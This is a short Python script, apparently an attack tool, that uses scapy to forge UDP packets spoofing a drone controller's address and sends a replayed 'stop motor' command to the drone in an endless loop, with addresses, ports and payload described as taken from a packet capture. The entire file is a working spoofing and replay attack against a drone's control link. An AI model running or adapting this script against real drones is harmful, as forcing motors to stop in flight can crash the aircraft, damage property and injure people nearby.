#!/usr/bin/python3

import time
from scapy.all import IP, UDP, send

############################################################
############ Insert data extracted from capture ############
############################################################

# Interface to use
IFACE = "wlan0"

# Drone ip read from capture
drone_ip = '172.50.10.1'

# Drone port read from capture
drone_port = 10005

# Controller ip read from capture
controller_ip = '172.50.10.254'

# Controller port read from capture
controller_port = 36263

# stop command payload read from capture
stop_command = bytearray.fromhex('401e0000fe1607ff0146dc05dc054c04dc0514054c04dc054c044c044c04ff018bd3')

############################################################
############################################################
############################################################

# build desired forged packages
ip = IP(src=controller_ip, dst=drone_ip)
udp = UDP(sport=controller_port, dport=drone_port)

pkt_stop_motor = ip/udp/stop_command

print("Send Packages...")
while True:
    send(pkt_stop_motor, iface=IFACE, verbose=0)
    time.sleep(0.05)
